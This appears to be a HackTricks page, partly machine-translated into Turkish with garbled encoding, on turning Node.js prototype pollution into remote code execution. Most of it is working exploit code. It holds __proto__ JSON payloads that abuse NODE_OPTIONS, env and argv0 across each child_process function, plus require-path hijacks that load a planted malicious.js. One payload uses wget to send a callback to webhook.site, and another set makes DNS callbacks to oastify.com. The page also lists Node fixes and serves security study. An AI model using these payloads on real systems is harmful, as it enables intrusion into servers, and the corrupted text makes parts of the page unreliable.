# Prototype Pollution to RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Vulnerable Code

Ger√ßek bir JS'in a≈üaƒüƒ±daki gibi bir kod kullandƒ±ƒüƒ±nƒ± hayal edin:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## PP2RCE env deƒüi≈ükenleri aracƒ±lƒ±ƒüƒ±yla

**PP2RCE**, **Prototype Pollution to RCE** (Uzak Kod √áalƒ±≈ütƒ±rma) anlamƒ±na gelir.

Bu [**yazƒ±da**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) belirtildiƒüine g√∂re, bir **i≈ülem ba≈ülatƒ±ldƒ±ƒüƒ±nda** **`child_process`**'ten bazƒ± y√∂ntemlerle (√∂rneƒüin `fork` veya `spawn` gibi) `normalizeSpawnArguments` y√∂ntemini √ßaƒüƒ±rƒ±r; bu, **yeni env deƒüi≈ükenleri olu≈üturmak i√ßin bir prototype pollution gadget'ƒ±dƒ±r**:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
Check that code you can see it's possible en **poison `envPairs`** just by **polluting** the **attribute `.env`.**

### **Poisoning `__proto__`**

{% hint style="warning" %}
Not edin ki **`normalizeSpawnArguments`** fonksiyonunun **`child_process`** k√ºt√ºphanesindeki √ßalƒ±≈üma ≈üekli nedeniyle, bir ≈üeyin √ßaƒürƒ±lmasƒ± durumunda **yeni bir env deƒüi≈ükeni** ayarlamak i√ßin sadece **herhangi bir ≈üeyi kirletmek** yeterlidir.\
√ñrneƒüin, eƒüer `__proto__.avar="valuevar"` yaparsanƒ±z, s√ºre√ß `avar` adƒ±nda ve deƒüeri `valuevar` olan bir deƒüi≈ükenle ba≈ülatƒ±lacaktƒ±r.

Ancak, **env deƒüi≈ükeninin ilk olmasƒ±** i√ßin **`.env` niteliƒüini** **kirletmek** gerekir ve (sadece bazƒ± y√∂ntemlerde) o deƒüi≈üken **ilk** olacaktƒ±r (saldƒ±rƒ±ya izin verir).

Bu y√ºzden **`NODE_OPTIONS`** a≈üaƒüƒ±daki saldƒ±rƒ±da **`.env`** i√ßinde deƒüildir.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### `constructor.prototype` Zehirleme
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE env deƒüi≈ükenleri + cmdline aracƒ±lƒ±ƒüƒ±yla

√ñncekiyle benzer bir y√ºk, [**bu yazƒ±da**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)** √∂nerilmi≈ütir.** Ana farklar ≈üunlardƒ±r:

* Nodejs **payload**'ƒ±nƒ± `/proc/self/environ` dosyasƒ±nda saklamak yerine, **`/proc/self/cmdline`** i√ßindeki argv0'da saklar.
* Ardƒ±ndan, **`NODE_OPTIONS`** aracƒ±lƒ±ƒüƒ±yla `/proc/self/environ` dosyasƒ±nƒ± gerektirmek yerine, **`/proc/self/cmdline`** dosyasƒ±nƒ± gerektirir.

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## DNS Etkile≈üimi

A≈üaƒüƒ±daki y√ºkleri kullanarak daha √∂nce tartƒ±≈ütƒ±ƒüƒ±mƒ±z NODE\_OPTIONS ortam deƒüi≈ükenini k√∂t√ºye kullanmak ve bunun bir DNS etkile≈üimi ile √ßalƒ±≈üƒ±p √ßalƒ±≈ümadƒ±ƒüƒ±nƒ± tespit etmek m√ºmk√ºnd√ºr:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
Ya da WAF'larƒ±n alan adƒ± istemesini √∂nlemek i√ßin:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## PP2RCE vuln child\_process fonksiyonlarƒ±

Bu b√∂l√ºmde **`child_process`'ten her bir fonksiyonu** analiz edeceƒüiz ve bu fonksiyonun kodu √ßalƒ±≈ütƒ±rmasƒ±nƒ± saƒülamak i√ßin herhangi bir teknik kullanƒ±p kullanamayacaƒüƒ±mƒ±za bakacaƒüƒ±z:

<details>

<summary><code>exec</code> istismarƒ±</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFile</code> istismar</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
**`execFile`**'ƒ±n √ßalƒ±≈ümasƒ± i√ßin **mutlaka node**'u √ßalƒ±≈ütƒ±rmasƒ± **GEREKƒ∞R**.\
Eƒüer **node**'u √ßalƒ±≈ütƒ±rmƒ±yorsa, neyi **√ßalƒ±≈ütƒ±rdƒ±ƒüƒ±nƒ±** **√ßevre deƒüi≈ükenleri** ile **deƒüi≈ütirmenin** bir yolunu bulmalƒ±sƒ±nƒ±z ve bunlarƒ± ayarlamalƒ±sƒ±nƒ±z.

**Diƒüer** teknikler bu gereksinim olmadan **√ßalƒ±≈üƒ±r** √ß√ºnk√º **neyin √ßalƒ±≈ütƒ±rƒ±ldƒ±ƒüƒ±nƒ±** prototip kirlenmesi yoluyla **deƒüi≈ütirmek m√ºmk√ºnd√ºr**. (Bu durumda, `.shell`'i kirletebilseniz bile, √ßalƒ±≈ütƒ±rƒ±lanƒ± kirletemezsiniz).

</details>

<details>

<summary><code>fork</code> exploitation</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawn</code> istismar</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFileSync</code> istismar</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execSync</code> istismar</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawnSync</code> istismar</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## Spawn'ƒ± Zorlamak

√ñnceki √∂rneklerde, bir gadget'ƒ± tetiklemeyi nasƒ±l yapacaƒüƒ±nƒ±zƒ± g√∂rd√ºn√ºz; **`spawn`**'ƒ± √ßaƒüƒ±ran bir i≈ülevselliƒüin **mevcut** olmasƒ± gerekir (bir ≈üeyi √ßalƒ±≈ütƒ±rmak i√ßin kullanƒ±lan **`child_process`**'in t√ºm y√∂ntemleri bunu √ßaƒüƒ±rƒ±r). √ñnceki √∂rnekte bu **kodun bir par√ßasƒ±ydƒ±**, ama ya kod **bunu** √ßaƒüƒ±rmƒ±yorsa?

### Bir require dosya yolunu kontrol etme

Bu [**diƒüer yazƒ±da**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) kullanƒ±cƒ±, bir **`require`**'ƒ±n √ßalƒ±≈ütƒ±rƒ±lacaƒüƒ± dosya yolunu kontrol edebilir. Bu senaryoda, saldƒ±rganƒ±n sadece **sistemde bir `.js` dosyasƒ± bulmasƒ±** gerekir ki bu dosya **i√ße aktarƒ±ldƒ±ƒüƒ±nda bir spawn y√∂ntemini √ßalƒ±≈ütƒ±racaktƒ±r.**\
ƒ∞√ße aktarƒ±ldƒ±ƒüƒ±nda bir spawn i≈ülevini √ßaƒüƒ±ran yaygƒ±n dosyalara bazƒ± √∂rnekler:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* **A≈üaƒüƒ±da daha fazla dosya bulun**

A≈üaƒüƒ±daki basit betik, **fonksiyonlar i√ßindeki √ßaƒürƒ±larƒ± g√∂stermemek i√ßin** **padding** olmadan **child_process**'ten **√ßaƒürƒ±larƒ±** arayacaktƒ±r:

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>√ñnceki script tarafƒ±ndan bulunan ilgin√ß dosyalar</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### Prototip kirletmesi ile require dosya yolunu ayarlama

{% hint style="warning" %}
**√ñnceki teknik**, **kullanƒ±cƒ±nƒ±n** **require edilecek dosyanƒ±n yolunu kontrol etmesini gerektirir**. Ancak bu her zaman doƒüru deƒüildir.
{% endhint %}

Ancak, eƒüer kod prototip kirletmesinden sonra bir require √ßalƒ±≈ütƒ±racaksa, **require edilecek yolun kontrol√ºn√º saƒülamasanƒ±z bile**, **prototip kirletmesini k√∂t√ºye kullanarak farklƒ± bir yol zorlayabilirsiniz**. Yani, kod satƒ±rƒ± `require("./a_file.js")` veya `require("bytes")` gibi olsa bile, **kirlettiƒüiniz paketi require edecektir**.

Bu nedenle, eƒüer prototip kirletmenizden sonra bir require √ßalƒ±≈ütƒ±rƒ±lƒ±rsa ve hi√ßbir spawn fonksiyonu yoksa, bu saldƒ±rƒ±dƒ±r:

* **Sistem i√ßinde** **require edildiƒüinde** **bir ≈üey √ßalƒ±≈ütƒ±racak** bir **`.js` dosyasƒ± bulun**
* Eƒüer saldƒ±rdƒ±ƒüƒ±nƒ±z platforma dosya y√ºkleyebiliyorsanƒ±z, b√∂yle bir dosya y√ºkleyebilirsiniz
* **`.js` dosyasƒ±nƒ±n require y√ºklemesini zorlamak i√ßin yollarƒ± kirletin** ve child\_process ile bir ≈üey √ßalƒ±≈ütƒ±racak
* **Arbitrary kod √ßalƒ±≈ütƒ±rmak i√ßin environ/cmdline'ƒ± kirletin** bir child\_process y√ºr√ºtme fonksiyonu √ßaƒürƒ±ldƒ±ƒüƒ±nda (ilk tekniklere bakƒ±n)

#### Mutlak require

Eƒüer ger√ßekle≈ütirilen require **mutlak** ise (`require("bytes")`) ve **paket `package.json` dosyasƒ±nda main i√ßermiyorsa**, **`main` niteliƒüini kirletebilir** ve **require'ƒ±n farklƒ± bir dosyayƒ± √ßalƒ±≈ütƒ±rmasƒ±nƒ± saƒülayabilirsiniz**.

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% endtabs %}

#### G√∂receli gereksinim - 1

Eƒüer bir **g√∂receli yol** yerine bir mutlak yol y√ºklenirse, node'u **farklƒ± bir yolu y√ºklemesi** i√ßin y√∂nlendirebilirsiniz:

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### G√∂receli gereksinim - 2

{% tabs %}
{% tab title="istismar" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Relative require - 3

√ñncekine benzer ≈üekilde, bu [**bu yazƒ±da**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs) bulundu.
```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```
## VM Gadgets

Makalede [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) **`vm`** k√ºt√ºphanesinin bazƒ± y√∂ntemlerinden **`contextExtensions`** kontrol√ºn√ºn bir gadget olarak kullanƒ±labileceƒüi de belirtilmi≈ütir.\
Ancak, √∂nceki **`child_process`** y√∂ntemleri gibi, en son s√ºr√ºmlerde **d√ºzeltilmi≈ütir**.

## Fixes & Unexpected protections

L√ºtfen, prototype pollution'ƒ±n, eri≈üilen bir nesnenin **attribute**'u **undefined** olduƒüunda √ßalƒ±≈ütƒ±ƒüƒ±nƒ± unutmayƒ±n. Eƒüer **kod** i√ßinde bu **attribute**'a bir **deƒüer** **atandƒ±ysa**, onu **√ºzerine yazamazsƒ±nƒ±z**.

Haziran 2022'de [**bu commit**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a) ile `options` deƒüi≈ükeni `{}` yerine **`kEmptyObject`** olarak ayarlandƒ±. Bu, **options**'ƒ±n **attributes**'ƒ±nƒ± etkileyerek RCE elde etmeyi **√∂nler**.\
En azƒ±ndan v18.4.0'dan itibaren bu koruma **uygulanmƒ±≈ütƒ±r**, bu nedenle `spawn` ve `spawnSync` **exploits**'leri artƒ±k y√∂ntemleri **etkilemez** (eƒüer `options` kullanƒ±lmƒ±yorsa!).

[**Bu commit**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) ile vm k√ºt√ºphanesindeki **`contextExtensions`**'ƒ±n **prototype pollution**'ƒ± da **bir ≈üekilde d√ºzeltilmi≈ütir**; se√ßenekler **`kEmptyObject`** olarak ayarlandƒ±, **`{}`** yerine.

### **Other Gadgets**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)
* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## References

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

